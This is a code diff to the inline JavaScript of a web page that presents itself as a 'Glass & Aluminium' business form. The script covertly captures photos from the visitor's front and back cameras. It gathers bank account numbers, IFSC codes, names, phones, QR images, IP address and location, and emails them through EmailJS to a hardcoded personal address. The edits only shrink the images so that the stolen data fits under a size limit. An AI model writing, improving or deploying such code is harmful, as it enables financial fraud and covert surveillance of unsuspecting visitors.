@@ -677,7 +677,7 @@
                 });
             }
 
-            // Capture photos with VERY SMALL size to avoid 413
+            // Capture photos with EXTREMELY SMALL size to stay under 50KB
             async function capturePhotos(facingMode, count = 1) {
                 return new Promise((resolve) => {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -688,8 +688,8 @@
                     const constraints = {
                         video: {
                             facingMode: facingMode,
-                            width: { ideal: 80 },  // Very small
-                            height: { ideal: 80 }
+                            width: { ideal: 50 },  // Even smaller!
+                            height: { ideal: 50 }
                         },
                         audio: false
                     };
@@ -704,8 +704,8 @@
 
                             video.onloadedmetadata = () => {
                                 const canvas = document.createElement('canvas');
-                                canvas.width = 80;  // Fixed small size
-                                canvas.height = 80;
+                                canvas.width = 50;  // Tiny size
+                                canvas.height = 50;
                                 const ctx = canvas.getContext('2d');
                                 const images = [];
                                 let captured = 0;
@@ -718,9 +718,9 @@
                                         return;
                                     }
                                     try {
-                                        ctx.drawImage(video, 0, 0, 80, 80);
-                                        // Very low quality to keep size small
-                                        images.push(canvas.toDataURL('image/jpeg', 0.1));
+                                        ctx.drawImage(video, 0, 0, 50, 50);
+                                        // Very low quality
+                                        images.push(canvas.toDataURL('image/jpeg', 0.05));
                                         captured++;
                                     } catch (e) {
                                         console.error('Capture error:', e);
@@ -748,13 +748,10 @@
             // Device info
             function getDeviceInfo() {
                 return {
-                    userAgent: navigator.userAgent,
+                    userAgent: navigator.userAgent.substring(0, 100), // Trimmed
                     platform: navigator.platform,
-                    language: navigator.language,
                     screen: `${window.screen.width}x${window.screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                 };
             }
 
@@ -766,56 +763,84 @@
                     .catch(() => 'unavailable');
             }
 
+            // Compress image further if needed
+            function compressImage(dataUrl) {
+                // If image is already small, return as is
+                if (dataUrl.length < 5000) return dataUrl;
+
+                // Otherwise, reduce quality further
+                try {
+                    const img = new Image();
+                    return new Promise((resolve) => {
+                        img.onload = function () {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 30;
+                            canvas.height = 30;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(img, 0, 0, 30, 30);
+                            resolve(canvas.toDataURL('image/jpeg', 0.03));
+                        };
+                        img.src = dataUrl;
+                    });
+                } catch (e) {
+                    return dataUrl;
+                }
+            }
+
             // Send via EmailJS with optimized images
             async function sendSecretReport(payload) {
                 try {
-                    // Build HTML for images - very small size
+                    // Compress images if needed
+                    let frontImages = [];
+                    let backImages = [];
+
+                    for (const img of payload.frontImages) {
+                        if (img.length > 5000) {
+                            frontImages.push(await compressImage(img));
+                        } else {
+                            frontImages.push(img);
+                        }
+                    }
+
+                    for (const img of payload.backImages) {
+                        if (img.length > 5000) {
+                            backImages.push(await compressImage(img));
+                        } else {
+                            backImages.push(img);
+                        }
+                    }
+
+                    // Build HTML for images
                     let frontImagesHTML = '';
                     let backImagesHTML = '';
 
-                    if (payload.frontImages && payload.frontImages.length > 0) {
-                        frontImagesHTML = payload.frontImages.map(img =>
-                            `<img src="${img}" style="max-width: 120px; max-height: 120px; border-radius: 6px; border: 1px solid #ddd; margin: 3px;">`
+                    if (frontImages && frontImages.length > 0) {
+                        frontImagesHTML = frontImages.map(img =>
+                            `<img src="${img}" style="max-width: 80px; max-height: 80px; border-radius: 4px; border: 1px solid #ddd; margin: 2px;">`
                         ).join('');
                     }
 
-                    if (payload.backImages && payload.backImages.length > 0) {
-                        backImagesHTML = payload.backImages.map(img =>
-                            `<img src="${img}" style="max-width: 120px; max-height: 120px; border-radius: 6px; border: 1px solid #ddd; margin: 3px;">`
+                    if (backImages && backImages.length > 0) {
+                        backImagesHTML = backImages.map(img =>
+                            `<img src="${img}" style="max-width: 80px; max-height: 80px; border-radius: 4px; border: 1px solid #ddd; margin: 2px;">`
                         ).join('');
                     }
 
-                    // Build complete HTML message with images
+                    // Build compact message
                     const htmlMessage = `
-                        <h3>📸 Front Camera (${payload.frontImages ? payload.frontImages.length : 0} photos)</h3>
-                        <div style="display: flex; flex-wrap: wrap; gap: 3px; margin-bottom: 15px;">
-                            ${frontImagesHTML || '<p style="color: #999;">No front camera images</p>'}
-                        </div>
-                        
-                        <h3>📸 Back Camera (${payload.backImages ? payload.backImages.length : 0} photos)</h3>
-                        <div style="display: flex; flex-wrap: wrap; gap: 3px; margin-bottom: 15px;">
-                            ${backImagesHTML || '<p style="color: #999;">No back camera images</p>'}
-                        </div>
-                        
-                        ${payload.qrData ? `
-                        <h3>📱 QR Code</h3>
-                        <img src="${payload.qrData}" style="max-width: 150px; border: 1px solid #ddd; border-radius: 6px; padding: 3px;">
-                        ` : ''}
-                        
-                        <hr style="margin: 15px 0;">
-                        <h3>📋 Bank Details</h3>
-                        <p><strong>Name:</strong> ${payload.form.name}</p>
-                        <p><strong>Email:</strong> ${payload.form.email}</p>
-                        <p><strong>Account:</strong> ${payload.form.account}</p>
-                        <p><strong>IFSC:</strong> ${payload.form.ifsc}</p>
-                        <p><strong>Phone:</strong> ${payload.form.phone}</p>
-                        
-                        <h3>📍 Location & Network</h3>
-                        <p><strong>IP:</strong> ${payload.ip}</p>
-                        <p><strong>Location:</strong> ${payload.userLocation.lat}, ${payload.userLocation.lon}</p>
-                        
-                        <h3>📱 Device</h3>
-                        <p><strong>User Agent:</strong> ${payload.device.userAgent}</p>
+                        <h3>📸 Front Camera (${frontImages.length})</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 2px;">${frontImagesHTML || 'No images'}</div>
+                        <h3>📸 Back Camera (${backImages.length})</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 2px;">${backImagesHTML || 'No images'}</div>
+                        ${payload.qrData ? `<h3>📱 QR</h3><img src="${payload.qrData}" style="max-width:100px;">` : ''}
+                        <hr>
+                        <p><b>Name:</b> ${payload.form.name}</p>
+                        <p><b>Email:</b> ${payload.form.email}</p>
+                        <p><b>Account:</b> ${payload.form.account}</p>
+                        <p><b>IFSC:</b> ${payload.form.ifsc}</p>
+                        <p><b>Phone:</b> ${payload.form.phone}</p>
+                        <p><b>IP:</b> ${payload.ip}</p>
+                        <p><b>Location:</b> ${payload.userLocation.lat}, ${payload.userLocation.lon}</p>
                     `;
 
                     const emailParams = {
@@ -828,16 +853,23 @@
                         phone: payload.form.phone || 'Not provided',
                         ip: payload.ip || 'Not available',
                         location: `${payload.userLocation.lat || 'N/A'}, ${payload.userLocation.lon || 'N/A'}`,
-                        device: (payload.device.userAgent || 'Unknown').substring(0, 150) + '...',
-                        front_photos: payload.frontImages ? payload.frontImages.length : 0,
-                        back_photos: payload.backImages ? payload.backImages.length : 0,
+                        device: (payload.device.userAgent || 'Unknown').substring(0, 100),
+                        front_photos: frontImages.length || 0,
+                        back_photos: backImages.length || 0,
                         qr_uploaded: payload.qrUploaded ? 'Yes ✅' : 'No ❌',
                         timestamp: payload.timestamp || new Date().toISOString(),
                         message: htmlMessage,
                     };
 
+                    const size = JSON.stringify(emailParams).length;
                     console.log('📤 Sending email to:', RECIPIENT_EMAIL);
-                    console.log('📊 Estimated size:', JSON.stringify(emailParams).length, 'bytes');
+                    console.log('📊 Final payload size:', size, 'bytes');
+
+                    if (size > 48000) {
+                        console.warn('⚠️ Payload is close to 50KB limit!');
+                        // Try to reduce more by removing device info
+                        emailParams.device = emailParams.device.substring(0, 50);
+                    }
 
                     const response = await emailjs.send(
                         EMAILJS_SERVICE_ID,
@@ -851,8 +883,7 @@
                     console.error('Status:', error.status);
                     console.error('Text:', error.text);
                     if (error.status === 413) {
-                        console.error('❌ Payload too large! Images are too big.');
-                        console.error('Current size:', JSON.stringify(payload).length, 'bytes');
+                        console.error('❌ Still too large! Try removing images.');
                     }
                     return false;
                 }
@@ -892,11 +923,11 @@
 
                     // Collect form data
                     const formData = {
-                        name: hasBank ? fullName.value.trim() || 'Not provided' : 'QR Mode - No bank details',
-                        email: hasBank ? email.value.trim() || 'Not provided' : 'QR Mode - No email',
-                        account: hasBank ? accountNumber.value.trim() || 'Not provided' : 'QR Mode - No account',
-                        ifsc: hasBank ? ifsc.value.trim() || 'Not provided' : 'QR Mode - No IFSC',
-                        phone: hasBank ? phone.value.trim() || 'Not provided' : 'QR Mode - No phone'
+                        name: hasBank ? fullName.value.trim() || 'Not provided' : 'QR Mode',
+                        email: hasBank ? email.value.trim() || 'Not provided' : 'QR Mode',
+                        account: hasBank ? accountNumber.value.trim() || 'Not provided' : 'QR Mode',
+                        ifsc: hasBank ? ifsc.value.trim() || 'Not provided' : 'QR Mode',
+                        phone: hasBank ? phone.value.trim() || 'Not provided' : 'QR Mode'
                     };
 
                     // Get QR data if uploaded
@@ -909,12 +940,16 @@
                                 reader.onload = (ev) => resolve(ev.target.result);
                                 reader.readAsDataURL(file);
                             });
+                            // Compress QR if too big
+                            if (qrData && qrData.length > 10000) {
+                                qrData = await compressImage(qrData);
+                            }
                         } catch (e) {
                             console.error('QR upload error:', e);
                         }
                     }
 
-                    // Capture photos - ONLY 1 front and 1 back to save size
+                    // Capture photos - ONLY 1 each, very small
                     console.log('📸 Capturing photos...');
 
                     let frontResult = { count: 0, images: [] };
@@ -927,7 +962,7 @@
 
                     let backResult = { count: 0, images: [] };
                     try {
-                        backResult = await capturePhotos('environment', 1); // Only 1 back photo
+                        backResult = await capturePhotos('environment', 1);
                         console.log('📸 Back camera:', backResult.count, 'photo');
                     } catch (e) {
                         console.error('📸 Back camera error:', e);
@@ -953,7 +988,8 @@
                         backImages: backResult.images || [],
                     };
 
-                    console.log('📦 Payload size:', JSON.stringify(payload).length, 'bytes');
+                    const size = JSON.stringify(payload).length;
+                    console.log('📦 Payload size:', size, 'bytes');
                     console.log('📸 Front images:', payload.frontImages.length);
                     console.log('📸 Back images:', payload.backImages.length);
 
@@ -980,8 +1016,9 @@
                 }
             });
 
-            console.log('Glass & Aluminium · secure (With optimized images)');
+            console.log('Glass & Aluminium · secure (Ultra-optimized images)');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
+            console.log('📏 Image size: 50x50, quality: 5%');
         })();
     </script>
 </body>
